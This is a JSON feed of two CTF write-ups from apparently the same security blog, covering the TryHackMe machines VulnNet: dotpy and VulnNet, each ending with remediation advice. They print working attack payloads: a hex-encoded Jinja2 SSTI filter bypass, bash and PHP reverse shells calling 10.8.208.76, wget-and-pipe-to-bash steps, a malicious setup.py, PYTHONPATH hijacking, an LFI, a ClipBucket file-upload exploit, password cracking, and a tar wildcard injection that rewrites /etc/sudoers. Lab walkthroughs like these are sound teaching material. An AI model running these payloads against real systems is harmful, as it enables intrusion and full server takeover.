[
  
  {
    "title": "VulnNet: dotpy",
    "url": "/posts/vulnnet-dotpy/",
    "categories": "capturetheflag, tryhackme",
    "tags": "python, jinja2, hex, ssti",
    "date": "2022-03-01 16:18:00 +0000",
    





    "snippet": "[01] OutlineVulnNet: dotpy is a medium difficulty box with a focus on Python. Starts off with finding an SSTI with URL filtering which leads into a Python package take over.[01] ReconnmapRunning nmap we find the single port 8080 open.nmap -sC -sV -oA nmap/scan -p- -v 10.10.132.101---snip---PORT     STATE SERVICE VERSION8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)| http-methods: |_  Supported Methods: HEAD GET OPTIONS| http-title: VulnNet Entertainment -  Login  | Discover|_Requested resource was http://10.10.132.101:8080/login|_http-server-header: Werkzeug/1.0.1 Python/3.6.9---snip---websiteBrowsing to http://10.10.132.101:8080 we’re greeted with a login and sign up form. Many of the links are anchors that lead nowhere.Since we know the page is loading we can run our gobuster scans, and we’ll need to add -b 403 to force the scan as the gobuster test scan is blocked by a 403 Unauthenticated error.gobustergobuster dir -u http://10.10.132.101:8080 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -o main.gobuster -b 403cat main.gobuster /login                (Status: 200) [Size: 5589]/register             (Status: 200) [Size: 5021]/logout               (Status: 302) [Size: 219] [--&amp;gt; http://10.10.132.101:8080/login]PursueWhile our scan is running we’ll quickly clone the site and check with pursue, but there isn’t anything of note here.wget -rkpN -e robots=off http://10.10.132.101:8080pursue --query | sort -upursue --domain | sort -upursue --endpoints | sort -uRegister and LoginClicking the Create New Account takes us to a /register page. We’ll use admin, admin@admin.com and password of admin, we’re prompted to log in.Once logged in we see an application dashboard, but we oddly have a user profile picture and the name of Staradmin.  It’s possible that using admin as our username has caused us to get picked off the top of the database or maybe this is what was meant to happen?Walking the siteAgain most of the links are only anchor tags. This took me about 2 hours to find a vulnerability, I tried clicking every button, downloading every file and page.Server Side Template InjectionAfter trying for an LFI at http://10.10.132.101:8080/etc/passwd you can see that the path /etc/passwd is reflected in the page.Since our nmap banner grab says this site is running Werkzeug we can try Server Side Template Injection (SSTI)  Misdiagnosing SSTI, XSS and LFI is can be easily done for beginners, be sure to take the time to validate your findings.Trying to go to the path http://10.10.132.101:8080/{{7*7}} shows the answer 49.HackTricks SSTI examples for other engines are below;  {{7*7}}  ${7*7}  &amp;lt;%= 7*7 %&amp;gt;  ${{7*7}}  #{7*7}Navigating to http://10.10.132.101:8080/{{config}} lists all the config items from with in the Python web server, but we’re unable to use full stops . in our query as there is some sort of blacklist being checked. After some testing we’re unable to use ., _, [, ], if we do, we get redirected to a 403 blocked page error.[03] ResearchAfter about a days research I came across this post https://gusralph.info/jinja2-ssti-research/ that goes into depth on how a Web Application Firewall (WAF) might block certain characters and how to bypass the filter with encoding.It would seam that this box is using the methods detailed in this paper as its inspiration.  The answer is given to us, but I took another few hours to dive into the topic to understand what is happening and how this works.  In real PenTests and Bug Bounty situations the answer may need adjustments made.Python InternalsMy understanding of this code is we’re using requests object that is available in this processing of our GET request on the server. Then we use this to traverse up the object tree within Python to the globals and finally down to the builtins functions of Python classes. From here this is the same as writing from os import popen within the Python interpreter or Python script.{{request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()}}Now that we know how to run raw Python code using the Jinja2 templating engine we have to get past the character blacklist.Below is the function I wrote to replicate the code given in the research post. We need to prepend \\x to inform Jinja2 that this is written in hex and not the string 5f.str(bytes(str(i).encode(&#39;utf-8&#39;)).hex())Explaining the code above; we take a single letter and encode it to utf-8. This insures Python know exactly what character it is, then we turn it into bytes, once it is in bytes we are able to convert it to hex. Finally, we prepend \\x to our hex value and turn the whole thing into a string.def utf8_encode(string):    _tmp = &#39;&#39;    for i in string:        if i in [&#39;.&#39;,&#39;[&#39;,&#39;]&#39;,&#39;_&#39;]:            _tmp += r&#39;\\x&#39; + str(bytes(str(i).encode(&#39;utf-8&#39;)).hex())        else:            _tmp += i    return _tmp.replace(&#39; &#39;,&#39;%20&#39;)CMD = &#39;id&#39;string_to_encode = &quot;{{request|attr(&#39;application&#39;)|attr(&#39;__globals__&#39;)|attr(&#39;__getitem__&#39;)(&#39;__builtins__&#39;)|attr(&#39;__getitem__&#39;)(&#39;__import__&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;COMMAND&#39;)|attr(&#39;read&#39;)()}}&quot;.replace(&#39;COMMAND&#39;,CMD)print(utf8_encode(string_to_encode)){{request|attr(&#39;application&#39;)|attr(&#39;\\x5f\\x5fglobals\\x5f\\x5f&#39;)|attr(&#39;\\x5f\\x5fgetitem\\x5f\\x5f&#39;)(&#39;\\x5f\\x5fbuiltins\\x5f\\x5f&#39;)|attr(&#39;\\x5f\\x5fgetitem\\x5f\\x5f&#39;)(&#39;\\x5f\\x5fimport\\x5f\\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;id&#39;)|attr(&#39;read&#39;)()}}Testing this command we are able to see the OS id command in our error page response.  We’ll update our payload to get a reverse shell.Running which%20wget to check if wget is available.  From further testing I’m unable to get / working in any of the commands.  This will require a multistep process to avoid use the forward slash.  We need to use %20 as our space encoding otherwise the server will try to parse it.[04] Attack ChainNow having all this information available to us, we’re able to start formulating our attack chain.  Create Bash reverse shell and save it as index.html.  This allows us to download this file without using a forward slash /.    #!/bin/bashbash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.8.208.76/4242 0&amp;gt;&amp;amp;1&#39;        Stand up a web server to publish our shell. sudo is required to use port 80, the default port for web servers.    sudo python3 -m http.server 80        Download file with wget.    {{request|attr(&#39;application&#39;)|attr(&#39;\\x5f\\x5fglobals\\x5f\\x5f&#39;)|attr(&#39;\\x5f\\x5fgetitem\\x5f\\x5f&#39;)(&#39;\\x5f\\x5fbuiltins\\x5f\\x5f&#39;)|attr(&#39;\\x5f\\x5fgetitem\\x5f\\x5f&#39;)(&#39;\\x5f\\x5fimport\\x5f\\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;wget%2010\\x2e8\\x2e208\\x2e76&#39;)|attr(&#39;read&#39;)()}}        Run netcat to catch reverse connection.    nc -lnvp 4242        Run reverse shell cat index.html|bash. To use the pipe | we’ll have to convert to hex \\x7c.    {{request|attr(&#39;application&#39;)|attr(&#39;\\x5f\\x5fglobals\\x5f\\x5f&#39;)|attr(&#39;\\x5f\\x5fgetitem\\x5f\\x5f&#39;)(&#39;\\x5f\\x5fbuiltins\\x5f\\x5f&#39;)|attr(&#39;\\x5f\\x5fgetitem\\x5f\\x5f&#39;)(&#39;\\x5f\\x5fimport\\x5f\\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;cat%20index\\x2ehtml\\x7cbash&#39;)|attr(&#39;read&#39;)()}}      [05] Foot HoldOur netcat listeners prompt changes, and we’re able to run commands as the web user. Let’s check for the other users on the system and our sudo privileges.web@vulnnet-dotpy:~$ cat /etc/passwd | grep sh$root:x:0:0:root:/root:/bin/bashsystem-adm:x:1000:1000:system-adm,,,:/home/system-adm:/bin/bashweb:x:1001:1001:,,,:/home/web:/bin/bashmanage:x:1002:1002:,,,:/home/manage:/bin/bashweb@vulnnet-dotpy:~$ sudo -lMatching Defaults entries for web on vulnnet-dotpy:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser web may run the following commands on vulnnet-dotpy:    (system-adm) NOPASSWD: /usr/bin/pip3 install *[06] Privilege EscalationBecause we can run pip3 install * as system-adm we’re able to run any Python file on the system.  The code below will reuse the work we have already completed.We’ll create a Python script called setup.py.  Using popen to run wget with -O - we are able to pipe index.html directly into bash.Run an new netcat listener to catch our reverse connection.nc -lnvp 4242echo &#39;from os import popenpopen(&quot;wget 10.8.208.76 -O -|bash&quot;)&#39; &amp;gt; setup.pysudo -u system-adm /usr/bin/pip3 install -e .Now we can easily collect our user.txt flag.system-adm@vulnnet-dotpy:~$ cat ~/user.txtTHM[REDACTED][07] ROOTRunning sudo -l again we can run /opt/backup.py using Python and also SETENV.system-adm@vulnnet-dotpy:~$ sudo -l---snip---User system-adm may run the following commands on vulnnet-dotpy:    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.pyWe don’t have read or write permissions to /opt, /opt/backup.py, or /home/manager that the script if referencing but taking a look at the top of the backup.py we can see it is importing a few packages.  This means we should be able to import our own package instead of original ones.from datetime import datetimefrom pathlib import Pathimport zipfile---snip---The SETENV permission lets us set the PYTHONPATH which dictates a directory that Python will use to search for packages.zipfile.pyGetting the backup script to run our own code is quite simple.  Create zipfile.py with the code we want to execute.    echo &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; &amp;gt; /tmp/zipfile.py        Run command    sudo PYTHONPATH=/tmp/ /usr/bin/python3 /opt/backup.py        Collect flag    root@vulnnet-dotpy:/tmp# cat /root/root.txt THM[REDACTED]      [08] RemediationIn this section we will talk about a few ways to mitigate the risks and vulnerabilities that we found in the system.SSTIThere was a good attempt to blacklist several characters from our URL requests. A simple fix here would not to to return any user input on the 404 error page.Backup ScriptRemoving SETENV permission from sudo will mitigate this issue.  Another fix would be to use another backup program instead of a custom Python script."
  },
  
  {
    "title": "VulnNet",
    "url": "/posts/vulnnet/",
    "categories": "capturetheflag, tryhackme",
    "tags": "lfi, tar, john, hashcat",
    "date": "2022-02-28 06:07:11 +0000",
    





    "snippet": "[01] OutlineVulnNet has a Medium difficulty rating running PHP as its web language. The brief states that it takes a more realistic approach to infiltrating the system.Our first step is to enumerate the subdomains and collect a username and password using LFI.Then, using an unauthenticated file upload vulnerability, we upload our reverse shell, and finally, all privilege escalation is accomplished through the use of a backup script and tar abuse.[02] ReconOur scope document says we should add vulnnet.thm to our hosts file.sudo echo &#39;10.10.94.236 vulnnet.thm&#39; &amp;gt;&amp;gt; /etc/hostsRunning nmap we find 2 ports open. Banners are reporting Ubuntu and an Apache web server.nmapnmap -sC -sV -oA nmap/vulnnet -v -p- -Pn vulnnet.thm# Nmap 7.92 scan initiated Mon Feb 28 09:48:27 2022 as: nmap -sC -sV -oA nmap/vulnnet -v -p- -Pn vulnnet.thmNmap scan report for vulnnet.thm (10.10.94.236)Host is up (0.066s latency).Not shown: 65533 closed tcp ports (conn-refused)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:|   2048 ea:c9:e8:67:76:0a:3f:97:09:a7:d7:a6:63:ad:c1:2c (RSA)|   256 0f:c8:f6:d3:8e:4c:ea:67:47:68:84:dc:1c:2b:2e:34 (ECDSA)|_  256 05:53:99:fc:98:10:b5:c3:68:00:6c:29:41:da:a5:c9 (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-title: VulnNet|_http-favicon: Unknown favicon MD5: 8B7969B10EDA5D739468F4D3F2296496| http-methods:|_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel--- snip ---Knowing that we have a web server, the next thing we’ll do is run two gobuster scans one to find additional subdomains and the other to enumerate content.  It’s always good practice to have automatic Recon going while you’re working. It will save you a lot of time when you need other avenues to explore.gobustergobuster vhost -u http://vulnnet.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o vulnnet-vhost.gobustergobuster dir -u http://vulnnet.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -o vulnnet-dir.gobusterWalking the websiteWhile our gobuster is scanning we can take a look at the website.  The first page has a subscribe form, checking the developer tools in Firefox we can see that there is no POST request and the button takes you back to the main page.Watching the network tab on the dev tools we can see that there are two js files being loaded, index__7ed54732.js and index__d8338055.js, we’ll take note of these and continue walking the site.Clicking the sign-in button takes you to a login form.  Brute forcing isn’t an option as we have no usernames or passwords to try.  Sign Up and Forgot Password are just Anchor Tags and don’t go anywhere.After spending a few minutes with BurpSuite trying various SQLI attacks we’re not getting any error messages or indication that SQLI is possible.  There isn’t anything else to try on the website, so we need to find other endpoints to probe.Now we move on to the JS files.  We can save them down with curl -O and run them through a bash port of tomnomnom’s go tool gf that I coded last week which I called pursue.mkdir srccd srccurl -O http://vulnnet.thm/js/index__7ed54732.jscurl -O http://vulnnet.thm/js/index__d8338055.jspursue --domains | sort -ubroadcast.vulnnet.thmvulnnet.thmSearching for domains in these two JS files we find vulnnet.thm which is the page we are on, and a new subdomain called broadcast.vulnnet.thm.  gobuster will find this address using ‘subdomains-top1million-5000.txt’broadcast.vulnnet.thmAdding broadcast.vulnnet.thm address to /etc/hosts and checking the website we’re prompted for a username and password.We’ll set gobuster to scan on broadcast.vulnnet.thm and check to see if there are any pages that do not require authentication. We’ll have to set -b 401 to ignore 401 Unauthorized status codes.gobuster dir -u http://broadcast.vulnnet.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -o broadcast.dirs -b 401Now we’re stuck since we’ve exhausted vulnnet.thm. Our directory scan didn’t find anything, and we’re waiting on our gobuster scan of broadcast.vulnnet.thm. We can go back and take a deeper look at the JS files.[03] Local File InclusionRunning pursue on our JS files shows that index__d8338055.js has a call with a referer parameter.pursue --query./index__d8338055.js:http://vulnnet.thm/index.php?referer=The code is heavily compacted, I honestly have no idea how to read it, but clearly it must be calling http://vulnnet.thm/index.php and setting referer= to something. Let’s take a closer look in BurpSuite.---snip---, n.n = function (e) {var t = e &amp;amp;&amp;amp; e.__esModule ? function () { return e.default } : function () { return e }; return n.d(t, &quot;a&quot;, t), t}, n.o = function (e, t) { return Object.prototype.hasOwnProperty.call(e, t) },         n.p = &quot;http://vulnnet.thm/index.php?referer=&quot;, n(n.s = 0)}({---snip---referer=When clicking on the subscribe button we can see that there is a new Header Referer: http://vulnnet.thm/?. So this JS file and function is setting referer to the current page we are currently on.  When you see query parameters in URLs, try LFI Local File Inclusion.Loading the page and sending the request to the repeater tab of Burp allows us to try many types of paths for our LFI.GET /index.php?referer=/etc/passwd HTTP/1.1Host: vulnnet.thmUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateDNT: 1Connection: closeUpgrade-Insecure-Requests: 1Trying /etc/passwd and searching the response for root: we get one match, meaning we read out the contents of /etc/passwd and we now have a list of all the users on this system.root:x:0:0:root:/root:/bin/bash---snip---server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bashmysql:x:112:123:MySQL Server,,,:/nonexistent:/bin/falsesshd:x:113:65534::/run/sshd:/usr/sbin/nologinApache configNow we can read out files that belong to the web server we should be able to find the Apache config files.From our nmap banners we know this system is running Apache httpd 2.4.29 on Ubuntu.  Searching the web for this information we’ll find that the default config location is /etc/apache2/apache2.conf and /etc/apache2/sites-available/000-default.confChecking /etc/apache2/sites-available/000-default.conf and finding the section for broadcast.vulnnet.thm we can see the path for AuthUserFile is /etc/apache2/.htpasswd.  This file should have a username and password.---snip---&amp;lt;VirtualHost *:80&amp;gt;	ServerAdmin webmaster@localhost	ServerName broadcast.vulnnet.thm	DocumentRoot /var/www/html	ErrorLog ${APACHE_LOG_DIR}/error.log	CustomLog ${APACHE_LOG_DIR}/access.log combined	&amp;lt;Directory /var/www/html&amp;gt;		Order allow,deny		allow from all		AuthType Basic		AuthName &quot;Restricted Content&quot;		AuthUserFile /etc/apache2/.htpasswd		Require valid-user	&amp;lt;/Directory&amp;gt;&amp;lt;/VirtualHost&amp;gt;---snip---Loading the .htaccess file we can see the username and password required for logging in.Trying this as the username and password doesn’t work. A string starting with $apr1$ is going to be a hash of the password. hashcat should be able to crack this.developers:$apr1$[REDACTED]Checking the example list of hashes from hashcat we can see this is 1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR).  Given enough time the password is eventually cracked, and we’re able to log into broadcast.vulnnet.thm.hashcat &#39;$apr1$[REDACTED]&#39; /usr/share/wordlists/rockyou.txt -m 1600---snip---$apr1$[REDACTED]:[REDACTED]Password SprayingNow we have a username and password we should try them on every possible service.            Service      Success                  SSH      No              vulnnet.thm      No              broadcast.vulnnet.thm      Yes      [04] ClipbucketAfter logging in we see that we’re now on some sort of media sharing site.  I’m immediately thing file upload for reverse shell.Trying the password on the Login button doesn’t work.  Now it’s time to run our recon with gobuster in dir mode.After spending a few minutes trying to sign up we are unable to get past the error.  Given this is blocked behind developer credentials we’ll assume the site is not fully functional.Reviewing our gobuster scan and filtering out the status codes of 403 Forbidden we can see a files’ directory.gobuster dir -u http://broadcast.vulnnet.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -U developers -P [REDACTED] -o broadcast.dirsgrep -v 403 broadcast.dirs/images               (Status: 301) [Size: 331] [--&amp;gt; http://broadcast.vulnnet.thm/images/]/includes             (Status: 301) [Size: 333] [--&amp;gt; http://broadcast.vulnnet.thm/includes/]/cache                (Status: 301) [Size: 330] [--&amp;gt; http://broadcast.vulnnet.thm/cache/]/plugins              (Status: 301) [Size: 332] [--&amp;gt; http://broadcast.vulnnet.thm/plugins/]/js                   (Status: 301) [Size: 327] [--&amp;gt; http://broadcast.vulnnet.thm/js/]/ajax                 (Status: 301) [Size: 329] [--&amp;gt; http://broadcast.vulnnet.thm/ajax/]/files                (Status: 301) [Size: 330] [--&amp;gt; http://broadcast.vulnnet.thm/files/]/LICENSE              (Status: 200) [Size: 2588]/api                  (Status: 301) [Size: 328] [--&amp;gt; http://broadcast.vulnnet.thm/api/]/styles               (Status: 301) [Size: 331] [--&amp;gt; http://broadcast.vulnnet.thm/styles/]/readme               (Status: 200) [Size: 2968]/.                    (Status: 200) [Size: 27216]/player               (Status: 301) [Size: 331] [--&amp;gt; http://broadcast.vulnnet.thm/player/]/actions              (Status: 301) [Size: 332] [--&amp;gt; http://broadcast.vulnnet.thm/actions/]/admin_area           (Status: 301) [Size: 335] [--&amp;gt; http://broadcast.vulnnet.thm/admin_area/]File UploadWith no way to sign up and our LFI only able to read files, we’ll need a vulnerability for this site.  Checking the pages source code we find ClipBucket version 4.0. Searching exploit-db we find ClipBucket &amp;lt; 4.0.0 - Release 4902 - Command Injection / File Upload / SQL Injection.SetupWe require a reverse shell to upload and since this is PHP server, so we’ll copy /usr/share/seclists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php to out current working directory as rev.php and edit the variables to match our IP and the port we want to use.---snip---set_time_limit (0);$VERSION = &quot;1.0&quot;;$ip = &#39;10.8.208.76&#39;;  // CHANGE THIS LOCAL IP TO CONNECT BACK TO$port = 4242;       // CHANGE THIS$chunk_size = 1400;$write_a = null;$error_a = null;$shell = &#39;uname -a; w; id; /bin/sh -i&#39;;$daemon = 0;$debug = 0;---snip---We’ll run netcat to catch our reverse shell and then run the exploit using curl.curl -F &quot;file=@rev.php&quot; -F &quot;plupload=1&quot; -F &quot;name=rev.php&quot; http://broadcast.vulnnet.thm/actions/photo_uploader.php -u developers:[REDACTED]{&quot;success&quot;:&quot;yes&quot;,&quot;file_name&quot;:&quot;1622174479d86fa0&quot;,&quot;extension&quot;:&quot;php&quot;,&quot;file_directory&quot;:&quot;2022\\/02\\/28&quot;}nc -lvnp 4242Once we see the file is uploaded we can navigate to http://broadcast.vulnnet.thm/files/photos/2022/02/28/1622174479d86fa0.php and load the file.  If everything was successful we’ll have a shell waiting.whoamiwww-data[05] Privilege EscalationFor quality of life work we’ll need a stable shell.python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;export TERM=xterm-256color{CTRL+Z}stty raw -echo;fg{ENTER}  {CTRL+Z} and {ENTER} are pressed keyboard keysFinding Backup FilesRunning sudo -l we’re prompted for the password.  Next we’ll try to find any interesting backup files written in the last 7 days.find / -type f \\( -iname &quot;*.bak&quot; -o -iname &quot;*.tar.gz&quot; \\) -mtime -10080 -exec ls -ldb --color {} \\; 2&amp;gt;/dev/null---snip----rw-r--r-- 1 root root 16643 Feb 23  2018 /usr/share/usb_modeswitch/configPack.tar.gz-rw------- 1 root shadow 1118 Jan 23  2021 /var/backups/shadow.bak-rw-rw-r-- 1 server-management server-management 1484 Jan 24  2021 /var/backups/ssh-backup.tar.gz-rw------- 1 root root 1831 Jan 23  2021 /var/backups/passwd.bak-rw------- 1 root shadow 712 Jan 23  2021 /var/backups/gshadow.bak-rw------- 1 root root 857 Jan 23  2021 /var/backups/group.bak---snip---Copying /var/backups/ssh-backup.tar.gz to /dev/shm/ and unpacking reveals an id_rsa ssh key.tar -xzf /dev/shm/ssh-backup.tar.gzCopying over the id_rsa to our machine and attempting to use it to ssh requires a password.  We can use ssh2john and then john to crack this password.Cracking SSH Keyspython2.7 /usr/share/john/ssh2john.py id_rsa &amp;gt; id_rsa.hashjohn --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hashUsing default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashes---snip---[REDACTED]     (id_rsa)---snip---Now we have the password and the file was owned by server-management lets try ssh into the machine.ssh server-management@vulnnet.thm -i id_rsaEnter passphrase for key &quot;id_rsa&quot;:lsuser.txtcat user.txtTHM[REDACTED][06] Privilege Escalation to RootTaking a look at the key parts of the backup script we can see that it will run tar * in /home/server-management/Documents. There is a neat trick with tar on gtfobins.---snip---cd /home/server-management/Documentsbackup_files=&quot;*&quot;---snip---# Backup the files using tar.tar czf $dest/$archive_file $backup_files---snip---Here we will create a script that when run as root it will overwrite the /etc/sudoers file with server-management ALL=(root) NOPASSWD: ALL allowing server-management to run any command as the root user.cd ~/Documentsecho &#39;echo &quot;server-management ALL=(root) NOPASSWD: ALL&quot; &amp;gt; /etc/sudoers&#39; &amp;gt; exploit.shecho &quot;&quot; &amp;gt; &quot; - checkpoint-action=exec=sh exploit.sh&quot;echo &quot;&quot; &amp;gt; - checkpoint=1After a short pause we can runsudo cat /root/root.txtTHM[REDACTED][07] Server HardeningIn this section we will make recommendations on how to harden the server and mitigate these vulnerabilities.ClipBucketClipBucket should be upgraded to version 4.1 from 4.0 as patch notes mention that the vulnerabilities used in our attack have been patched.PasswordsThe passwords used for both the developers and server-management accounts should be increased in length and complexity.  Using a password manager that is able to check against known passwords lists should also be considered.LFIThis section of the code found in the index.html should be removed as it doesn’t provide any functionality.&amp;lt;?php$file = $_GET[&#39;referer&#39;];$filter = str_replace(&#39;../&#39;,&#39;&#39;,$file);include($filter);?&amp;gt;Backuptar should not be used to back up files using the * on the GNU version. Moving to another program such as gunzip is recommended as no known privilege escalation is available at this time."
  }
  
]

